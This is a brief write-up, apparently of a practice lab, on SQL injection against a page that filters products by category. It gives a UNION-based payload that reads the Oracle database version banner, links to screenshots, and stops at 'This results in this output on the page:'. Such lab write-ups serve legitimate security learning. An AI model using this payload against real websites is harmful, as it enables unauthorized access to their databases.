This is a vulnerable page which will be conduct SQL Injection attack by query

SELECT * FROM someTable WHERE category=Gifts


![image](https://user-images.githubusercontent.com/65653010/235273796-6e284c0d-3450-4b87-845a-422a339ab40b.png)

For this we do a Injection query 

SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a',banner FROM v$version--'

![image](https://user-images.githubusercontent.com/65653010/235273802-bbd568a8-5862-4c10-8b73-f078ec8be4e4.png)

![image](https://user-images.githubusercontent.com/65653010/235425011-f1518697-ae67-49b8-9a16-6dbde255f090.png)

This results in this output on the page: 
